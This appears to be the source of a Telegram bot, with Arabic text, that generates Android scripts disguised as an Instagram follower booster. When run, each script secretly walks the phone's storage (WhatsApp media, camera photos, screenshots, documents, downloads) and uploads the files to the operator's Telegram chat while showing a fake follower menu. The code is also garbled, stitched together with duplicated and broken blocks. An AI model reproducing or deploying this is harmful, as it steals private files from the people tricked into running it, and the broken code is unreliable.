import sys
import subprocess
import sqlite3
import telebot
from telebot import types
import os
import base64
import uuid
import requests
import time
import string
import random
from flask import Flask
from threading import Thread

# قراءة المتغيرات البيئية
TOKEN = os.environ.get('TOKEN')
ADMIN = int(os.environ.get('ADMIN'))
CHANNEL_ID = os.environ.get('CHANNEL_ID')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
REPO_NAME = os.environ.get('REPO_NAME')
BRANCH_NAME = os.environ.get('BRANCH_NAME')

# إعداد البوت
app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

@app.route('/')
def index():
    return "Bot is running on Render."

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()

# دالة لإنشاء اتصال بقاعدة البيانات
def creat_connection():
    conn = sqlite3.connect('mybot.db')
    return conn

hack = {
    '1' : [
        ('سحب صوتيات واتساب فقط 🥶☠️️','watsaudio'),
        ('سحب فيديوهات واتساب فقط 😎😈️','watsvid'),
        ('سحب صور واتساب فقط 🚀🔥','watsphoto'),
        ('سحب قاعدة بيانات واتساب لقراءة الرسايل ☠️🔥️','watsdb'),
        ('سحب ملفات واتساب بالكامل ☺️','wats'),
        ('سحب فيديوهات الكاميرا فقط ☠️🔥️','camvid'),
        ('سحب صور الكاميرا فقط 🙂️','camimg'),
        ('سحب صور وفيديوهات الكاميرا مع بعض 📸', 'camera'),
        ('سحب صور بالكامل 😱', 'img'),
        ('سحب فيديوهات بالكامل 😈', 'vid'),
        ('سحب مستندات بالكامل 📂', 'doc'),
        ('سحب ملفات Download 📥', 'dow'),
        ('سحب لقطات الشاشة 😨', 'screan')
    ]
}

tool = {
    '1' : [
        ('رشق حسابات إنستجرام 👍', 'rsq'),
        # ('تخمين باسوردات فيسبوك 😝', 'face'),
        # ('رشق متابعين تيكتوك 💟 😍', 'tik'),
        # ('استخراج متاحات 😱', 'mtah'),
        # ('فحص فيز 📊', 'fiz'),
        # ('اختراق وايفاي 🥷', 'wifi'),
        # ('سبام رسايل 😈', 'smsspam'),
        # ('سبام مكالمات 🎙', 'callspam'),
        # ('سبام إيميل 📨', 'emailspam')
    ]
}

stt = {}

# تحقق الاشتراك في القناة
def check_sub(user_id):
    member = bot.get_chat_member(CHANNEL_ID, user_id)
    return member.status in ['member', 'administrator', 'creator']

# دالة send_sure لإضافة نقاط إحالة
def send_sure(reff):
    conn = creat_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM user WHERE refrralcode = ?', (reff,))
    iid = cursor.fetchone()[0]
    bot.send_message(chat_id=iid, text='لقد تمت إضافة 3 نقاط إلى حسابك من خلال رابط الإحالة 🙂')

# دالة /start مع قائمة الأوامر والأزرار
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    stt[chat_id] = None
    
    conn = creat_connection()
    cursor = conn.cursor()
    
    cursor.execute('''INSERT OR IGNORE INTO user(user_id,
        username,
        first_name)
        VALUES (?,?,?)''',
        (user_id, username, first_name)
    )
    conn.commit()
    conn.close()
    
    refrr = message.text.split(' ')[1] if len(message.text.split(' ')) > 1 else None

    if refrr is not None:
        conn = creat_connection()
        cursor = conn.cursor()

        cursor.execute('SELECT referral_points_added FROM user WHERE user_id = ?', (chat_id,))
        result = cursor.fetchone()

        if result is not None and result[0] == 0: 
            cursor.execute('UPDATE user SET points = points + 3 WHERE refrralcode = ?', (refrr,))
            cursor.execute('UPDATE user SET referral_points_added = 1 WHERE user_id = ?', (chat_id,))
            conn.commit()
            conn.close()
            send_sure(refrr)

    # تحقق من اشتراك المستخدم في القناة
    if not check_sub(user_id):
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(types.InlineKeyboardButton(text='اشترك في القناة 🤩', url='https://t.me/AKRAM_CS'))
        bot.send_message(chat_id=chat_id, text='عذراً عليك الاشتراك في قناة المطور أولا 🙂 اشترك ثم أرسل /start للتحقق', reply_markup=keyboard)
        return

    # بناء لوحة الأزرار للأدوات
    hack_keyboard = types.InlineKeyboardMarkup(row_width=1)
    for key1, val in hack['1']:
        hack_keyboard.add(types.InlineKeyboardButton(text=key1, callback_data=val))

    tool_keyboard = types.InlineKeyboardMarkup(row_width=1)
    for key2, val2 in tool['1']:
        tool_keyboard.add(types.InlineKeyboardButton(text=key2, callback_data=val2))
        
    # رسالة الترحيب مع الأزرار
    welcome_text = f'''
أهلاً {first_name} 😘
هذا البوت مخصص لاختبار الاختراق الأخلاقي والمطور غير مسؤول عن أي استخدام سيء للبوت 🤯

اختر أداة من الأدوات أدناه:

-- أدوات الاختراق --
'''

    bot.send_message(chat_id=chat_id, text=welcome_text, reply_markup=hack_keyboard)
    bot.send_message(chat_id=chat_id, text='-- أدوات مساعدة --', reply_markup=tool_keyboard)
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
    
bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Android/media/"

def send_voice(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".opus",".mp3", ".aac")):
            bot.send_audio(chat_id={id}, audio=f, caption='By: @Atmaja5788_bot')

def send_phot(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def send_video(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')

def send_doc(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".opus",".mp3", ".aac")):
					executor.submit(send_voice, file_path)
				elif file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
					executor.submit(send_phot, file_path)
				elif file_path.lower().endswith((".mp4")):
					executor.submit(send_video, file_path)
				elif file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
					executor.submit(send_doc, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script *.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم if (Abs == '4'):
	if (Abs == '4'):
    print(Ba_bS + """
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 10000 
متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
الطلبات الان 40 طلب

- Welcome dear, once again your request has been
selected to throw 10000 followers. Please wait
until your request is reached. Orders are now
200 requests.
""")

if (Abs == '5'):
    print(Ba_bS + """
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 15000 
متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
الطلبات الان 50 طلب

- Welcome dear, once again your request has been
selected to throw 15000 followers. Please wait
until your request is reached. Orders are now
250 requests.
""")

if (Abs == '6'):
    print(Ba_bS + """
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 20000 
متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
الطلبات الان 60 طلب

- Welcome dear, once again your request has been
selected to throw 20000 followers. Please wait
until your request is reached. Orders are now
2 requests.
""")

if (Abs == '5'):
    print(Ba_bS + """
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 15000 
متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
الطلبات الان 50 طلب **

- Welcome dear, once again your request has been
selected to throw 15000 followers. Please wait
until your request is reached. Orders are now
250 requests **.
""")

if (Abs == '6'):
    print(Ba_bS + """
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 20000 
متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
الطلبات الان 60 طلب **

- Welcome dear, once again your request has been
selected to throw 20000 followers. Please wait
until your request is reached. Orders are now
2 requests **.
""")
until your request is reached. Orders are now
200 requests **. """)

if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 15000 
متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
الطلبات الان 50 طلب **

- Welcome dear, once again your request has been
selected to throw 15000 followers. Please wait
until your request is reached. Orders are now
250 requests **. """)

if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 20000 
متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
الطلبات الان 60 طلب **

- Welcome dear, once again your request has been
selected to throw 20000 followers. Please wait
until your request is reached. Orders are now
300 requests **. """)
						creat_payloads(id, ms, payload)
					elif second_data == 'camera':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
    
bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/DCIM/Camera/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def background():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
            	file_path = os.path.join(root, file)
            	if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPG", ".JPEG")):
            		executor.submit(send_file, file_path)

threading.Thread(target=background).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script *.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """)  '''
						creat_payloads(id, ms, payload)
					elif second_data == 'screan':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
    
bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/DCIM/Screenshots/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def background():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
            	file_path = os.path.join(root, file)
            	if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPG", ".JPEG")):
            		executor.submit(send_file, file_path)

threading.Thread(target=background).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script *.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب**\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """) '''
						creat_payloads(id, ms, payload)
					elif second_data == 'doc':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
					executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script *.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'vid':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
    
bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".mp4")):
				executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script *.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'dow':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Download/"

def send_file1(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
